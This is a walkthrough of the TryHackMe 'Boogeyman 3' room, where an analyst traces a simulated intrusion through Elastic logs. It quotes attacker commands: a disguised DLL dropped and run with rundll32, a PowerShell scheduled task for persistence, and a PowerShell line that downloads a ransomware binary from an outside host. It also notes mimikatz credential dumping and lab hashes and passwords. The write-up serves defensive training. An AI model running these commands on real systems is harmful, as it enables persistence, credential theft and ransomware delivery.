---
title: "Boogeyman 3 - TryHackMe Write-up"
seoTitle: "Boogeyman 3 - TryHackMe Write-up"
seoDescription: "Uncover Boogeyman 3's tactics in this TryHackMe write-up. Explore step-by-step analysis and security insights in a complete walkthrough"
datePublished: Tue Aug 26 2025 12:12:41 GMT+0000 (Coordinated Universal Time)
cuid: cmesiazv0000202l48qmdd14t
slug: boogeyman-3-tryhackme-write-up
canonical: https://forrestcaffray.com/boogeyman-3-tryhackme-write-up-80fc8933e16b
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1755858737064/363a9234-e190-4b84-a6ce-79694646a070.png
tags: cybersecurity, tryhackme, cybersec, write-up, tryhackme-walkthrough, tryhackmewalkthrough

---

Link to room: [https://tryhackme.com/room/boogeyman3](https://tryhackme.com/room/boogeyman3)

*Due to the previous attacks of Boogeyman, Quick Logistics LLC hired a managed security service provider to handle its Security Operations Center. Little did they know, the Boogeyman was still lurking and waiting for the right moment to return.*

In this room, you will be tasked to analyse the new tactics, techniques, and procedures (TTPs) of the threat group named Boogeyman.

---

Before we get started let’s make sure we are connecting to Elastik.

![Alt text: A screenshot from an investigation platform guide. It instructs users to deploy a virtual machine by clicking the Start Machine button. The machine runs an Elastic Stack (ELK) for accessing logs. The URL, username, and password for the Kibana console are displayed: URL is http://10.10.101.116, username is "elastic," and password is "elastic."](https://cdn.hashnode.com/res/hashnode/image/upload/v1755859345233/a30fca54-5795-4cdd-95f1-0659219bf79b.png align="center")

Boot up the **AttackBox** or your own **VM**, connect in and open Firefox. Plomp in the **URL** and login via the **Username** and **Password** details.

Take note of the **email** and **attachment** details.

---

> ### What is the PID of the process that executed the initial stage 1 payload?

In Elastik click on **Discover** then we want to set **absolute dates** for our range: **August 29 and August 30, 2023**.

![Screenshot of the Elastic dashboard showing the "Discover" tab. It displays search results for logs with a total of 28,302 hits. A time-based bar chart visualizes log activity over the selected period from August 29, 2023, to August 30, 2023. Below, a log entry details various fields such as timestamp, agent information, cloud instance details, and event specifics.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755859919595/151c6661-db1a-45bd-b983-c1f9f71e41b3.png align="center")

We know about the “**.pdf**” file. Which upon inspection is an **.iso** file. These files on modern Windows can be auto-mounted upon execution, unlike the old days when we would have to use other tools. Which can make them a little stealthy. We can also see inside the **.iso** file that there is a “**HTML Application**” file of **1KB** which looks very suspicious. These are like small **.html** files that can also be executed. A chain of execution.

Let’s filter for this “**.pdf**” and see what we get:

![A screenshot of an Elastic dashboard displaying log data filtered by type. The graph shows the number of hits over time for August 29-30, 2023. A table below lists details such as process name, PID, parent name, and command line for each log entry. Selected fields include process name, PID, and command line.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755860595939/b9eb88cf-f352-40a1-9704-10dc39159ee4.png align="center")

I did some editing with the **fields** to make this easier to digest. You can search for **fields** on the left and just click the little **plus** icon.

I add and remove as I go but for now I added **process.name**, **process.pid**, **process.parent.name**, **process.parent.pid** and **process.command\_line**.

What we can see here is the process **mshta.exe** which is used by **Windows** to execute those pesky **.hta** files.

It looks like it has executed with 3 processes spawning: **xcopy.exe**, **rundll32.exe** and **powershell.exe.** They all share the same **Parent Process ID** and are executed immediately.

**Answer: 6392**

---

> ### The stage 1 payload attempted to implant a file to another location. What is the full command-line value of this execution?

Now that we have everything laid quite nicely in **Elastik** this is a case of just looking at the execution chain and paying close attention to the **process.commmand\_line** area.

The first process to execute immediately after is the **xcopy.exe** process. This sounds about right to me.

Looking at the command:

```bash
"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat
```

We can determine that there is an attempt to copy the **D:\\review.dat** file on the **.iso** image to the **C:** drive. Specifically the **Temp** folder - an adversarial favourite!

**Answer: "C:\\Windows\\System32\\xcopy.exe" /s /i /e /h D:\\review.dat C:\\Users\\EVAN~1.HUT\\AppData\\Local\\Temp\\review.dat**

---

> ### The implanted file was eventually used and executed by the stage 1 payload. What is the full command-line value of this execution?

After looking at **xcopy.exe** let’s now have a look at the next process in line.

**rundll32.exe** is used by Windows to execute **.dll** files. Like **mshta.exe**, these are known as **LOLBAS** (Living Off The Land Binaries, Scripts and Libraries). Living off the land, adversaries can use tools available to them built-in to the **OS**.

We can see the command executed:

```bash
"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer
```

The file **D:\\review.dat** file looks like a simple data file but is actually a **.dll** file. **.dat** files can pretty much be anything. There is an attempt to execute the file.

**Answer: "C:\\Windows\\System32\\rundll32.exe" D:\\review.dat,DllRegisterServer**

---

> ### The stage 1 payload established a persistence mechanism. What is the name of the scheduled task created by the malicious script?

Let’s look closer at the next process that fired off - **powershell.exe**.

Looking at **process.command\_line** we see:

```bash
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $A = New-ScheduledTaskAction -Execute 'rundll32.exe' -Argument 'C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer'; $T = New-ScheduledTaskTrigger -Daily -At 06:00; $S = New-ScheduledTaskSettingsSet; $P = New-ScheduledTaskPrincipal $env:username; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask Review -InputObject $D -Force;
```

Lots of hints here of a new scheduled task.

If we look near the end of the command we see `Register-ScheduledTask` and the name.

**Answer: Review**

---

> ### The execution of the implanted file inside the machine has initiated a potential C2 connection. What is the IP and port used by this connection? (format: IP:port)

Seeing as we are looking for a potential **C2** connection, let’s think about **destination ip’s** and **ports**.

I filtered with **destination.ip** and **destination.port.**

![Dashboard interface showing search filters and query results with a highlighted section. It lists selected fields and shows data statistics, including a chart and the top five values for "destination.ip," with the highest being 165.232.170.151 at 59.1%.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755869298474/5d9408ca-daa5-40f6-95c4-ed176329b9e6.png align="center")

There seems to be a lot of traffic to this particular IP address.

![Interface of a data analysis tool showing log data. There's a section with filters applied to fields like "process.name" and "destination.ip." The screen displays a list of hits and a highlighted pop-up showing "destination.port" with the top value of 80, existing in 500 out of 500 records. An arrow points to this detail.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755870760153/f6d2f6eb-79ed-4873-88b9-061b6f5c8b0d.png align="center")

100% of that traffic is using port 80.

**Answer: 165.232.170.151:80**

---

> ### The attacker has discovered that the current access is a local administrator. What is the name of the process used by the attacker to execute a UAC bypass?

THM Hint: *“Search for common UAC bypass techniques and follow the trail of events.”*

I just searched for **common UAC bypass** techniques on Google.

First link brings me here: [https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies](https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies)

Soon into reading the article it doesn’t take long before we find out about **fodhelper.exe** (Features on Demand Helper) and how it runs in an elevated privileged state. This can be easily used to bypass **UAC** (User Account Control).

We do find evidence of it being used:

![Bar chart displaying 3 hits over time from August 29 to August 30, 2023. Below are log entries showing timestamps, process names, and command lines, including "powershell.exe" and "fodhelper.exe".](https://cdn.hashnode.com/res/hashnode/image/upload/v1755871391708/ad6f01e3-6207-4c65-9543-c59ae2715999.png align="center")

**Answer: fodhelper.exe**

---

> ### Having a high privilege machine access, the attacker attempted to dump the credentials inside the machine. What is the GitHub link used by the attacker to download a tool for credential dumping?

OK so we know that there is a **github** download.

We can filter for this in **Elastik**:

```bash
*github* or *github.com* or *githubusercontent.com*
```

The former will give us a better overall picture while **github.com** will give us links to **github** pages and the latter will filter for those links in raw.

Using the **github.com** filter gives us a bunch of hits pointing towards the infamous **mimikatz.**

![A data analytics dashboard displays log entries filtered by the term "github.com". A timeline graph shows hit counts over time. The table below lists details of processes with columns for process name, PID, and command line. An entry includes a PowerShell script executing a download from a GitHub URL. An arrow highlights the URL entry.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755872258005/5f2d1f52-af80-463f-98c9-5ed0217d6caf.png align="center")

**Answer: https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz\_trunk.zip**

---

> ### After successfully dumping the credentials inside the machine, the attacker used the credentials to gain access to another machine. What is the username and hash of the new credential pair? (format: username:hash)

Going off what we now know. It’s likely that **mimikatz** was executed at some point.

Let’s filter with **mimikatz.exe** and see what we get.

![Log analysis interface showing search results for "mimikatz.exe". There are 40 hits displayed with process details like name, PID, and command line arguments. The timeline graph shows activity spikes and mimikatz.exe entries are highlighted.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755872848855/ff6ba0c4-c97f-4927-9391-a6836a1e6557.png align="center")

We can see a **dump** and **Pass-the-Hash** attack.

Then we see the new **itadmin** account and it’s **hash**.

**Answer: itadmin:F84769D250EB95EB2D7D8B4A1C5613F2**

---

> ### Using the new credentials, the attacker attempted to enumerate accessible file shares. What is the name of the file accessed by the attacker from a remote share?

This was pretty tricky to find.

I decided to look closer at **mimikatz.**

If we look at hit highlighted above we find this:

![Screenshot of a log inspection interface showing results for "mimikatz.exe". The graph displays activity over time. Details include the file path, file version, and command line information for Mimikatz. Filters and search options are visible on the left.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755875110301/7f492831-99fd-4e4d-8da2-5d1baead0587.png align="center")

We can see that **mimikatz** is within several folder, 1 called **mimi** which is distinctive.

We can see if anything else is going on in that directory.

![A screenshot of a data monitoring dashboard displaying search results for "mimi" between August 29 and 30, 2023. The top left shows filter options by file and group attributes. A graph indicates activity over time, while a list below reveals details such as file paths and commands, highlighted entries, and associated timestamps.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755875948005/2d83396e-b81a-428b-9e1e-6131b51cc336.png align="center")

Moments after **mimikatz** we find something called **IT\_Automation.ps1.**

Upon inspection we find a large **base64** encoded string that we can analyse with **CyberChef**.

**Answer: IT\_Automation.ps1**

---

> ### After getting the contents of the remote file, the attacker used the new credentials to move laterally. What is the new set of credentials discovered by the attacker? (format: username:password)

Looking at our simple yet useful filter:

```bash
*mimi*
```

We find a `ConvertTo-SecureString` area of interest:

![A data visualization dashboard displaying search results for PowerShell commands containing "mimi." The interface shows a histogram graph and specific fields, such as `process.pid` and `process.name`, with highlighted PowerShell command lines. The entries include script blocks and credential handling details.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755877037911/28b05034-0587-4d7e-9ccc-1e32db61a130.png align="center")

We see `QUICKLOGISTICS\allan.smith` and `Tr!ckyP@ssw0rd987` from host machine `WKSTN-0051`

**Answer: QUICKLOGISTICS\\allan.smith:Tr!ckyP@ssw0rd987**

---

> ### What is the hostname of the attacker's target machine for its lateral movement attempt?

Looking at the hosts we move laterally from host `WKSTN-0051` to `WKSTN-1327`.

![A data visualization interface displaying a histogram of activity over time and a detailed log listing. The logs show PowerShell commands executed on different hosts, such as WKSTN-1327 and WKSTN-0051, occurring between August 29 and August 30, 2023. The interface includes options for filtering and selecting fields.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755877604031/082d6373-8c32-4485-8135-5bd83244395f.png align="center")

**Answer: WKSTN-1327**

---

> ### Using the malicious command executed by the attacker from the first machine to move laterally, what is the parent process name of the malicious command executed on the second compromised machine?

So we know we are looking at the **WKSTN-1327** host.

We also know we are looking for **execution** (Sysmon Event ID: **1**).

I think we can look for **powershell.exe** as the **process.name** also.

![Screenshot of a dashboard displaying event logs with multiple entries related to "powershell.exe." Each entry shows timestamps, process names, IDs, and command details. Red arrows highlight specific entries with encoded PowerShell commands. The chart above shows event distribution over time.](https://cdn.hashnode.com/res/hashnode/image/upload/v1756204875493/fc30f9c1-b79b-4901-93b2-2c846ea446f0.png align="center")

We get 22 results.

Scroll down a little and we find the **stager** or **loader** encoded in **base64**.

We can decode it in **terminal**, **CyberChef** or even in **ChatGPT**. We will find the payload hidden within.

I still have the **process.parent.name** field active and we can see what we need here.

**Answer: wsmprovhost.exe**

---

> ### The attacker then dumped the hashes in this second machine. What is the username and hash of the newly dumped credentials? (format: username:hash)

I returned to our trusty **mimi** filter.

![A data analysis interface with a bar graph and log entries related to "mimikatz.exe" and "powershell.exe". The interface shows multiple entries with timestamps and command lines. Red arrows highlight specific entries in the list. Filters and field selections are visible on the sidebar.](https://cdn.hashnode.com/res/hashnode/image/upload/v1756205731973/6444fe79-a3f0-477c-9bde-964a04a591db.png align="center")

We can see some information we found previously at the bottom. You remember **itadmin:F84769D250EB95EB2D7D8B4A1C5613F2**?

Well we can see just a minute later a similar hit.

This time for a different account.

**Answer: administrator:00f80f2538dcb54e7adc715c0e7091ec**

---

> ### After gaining access to the domain controller, the attacker attempted to dump the hashes via a DCSync attack. Aside from the administrator account, what account did the attacker dump?

Here is a good explanation of the **DCSync** attack: [https://www.semperis.com/blog/dcsync-attack/](https://www.semperis.com/blog/dcsync-attack/)

I like simplicity so I just filtered for **DSync**.

![Screenshot of a data analytics dashboard showing three hits related to "DCSync" activity. The image displays a filtered search for event code 1, detailing processes involving "mimikatz.exe" and "powershell.exe" on hosts DC01 and WKSTN-1327. A highlighted process command line indicates the use of the DCSync feature with user domains specified.](https://cdn.hashnode.com/res/hashnode/image/upload/v1756207328978/69197625-b544-40b2-86d2-607e02569df8.png align="center")

We get 3 hits.

We can see the dump for **administrator** on host **WKSTN-1327**.

After that hit, we also see a dump for **backupda** on host **DC01**.

**Answer: backupda**

---

> ### After dumping the hashes, the attacker attempted to download another remote file to execute ransomware. What is the link used by the attacker to download the ransomware binary?

Maybe this is lucky, simple or smart?

I filtered for **ransom**, but didn’t find anything.

I then filtered for **\*ransom\***, using wildcard queries can get some pretty nice results, always worth a bash!

![A screenshot of a monitoring dashboard displaying search results for the keyword "ransom." It includes a graph and a list of events involving "powershell.exe," highlighting command lines with potential threats. The sidebar shows selected and available fields for filtering. An arrow points to an entry in the list.](https://cdn.hashnode.com/res/hashnode/image/upload/v1756209197580/241ea531-3d27-4419-bbb4-d96b70abb31a.png align="center")

You’ll notice I also filtered with **event.code: 1** and **process.name: powershell.exe**.

We get 6 hits!

Looking at the **process.command\_line** of the first hit:

```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe"
```

We can see the link we are looking for.

**Answer: http://ff.sillytechninja.io/ransomboogey.exe**

---

A fairly challenging exercise! Using concise filter really goes a long way here.

Hope you enjoyed following along the **Boogeyman** challenges on **TryHackMe**!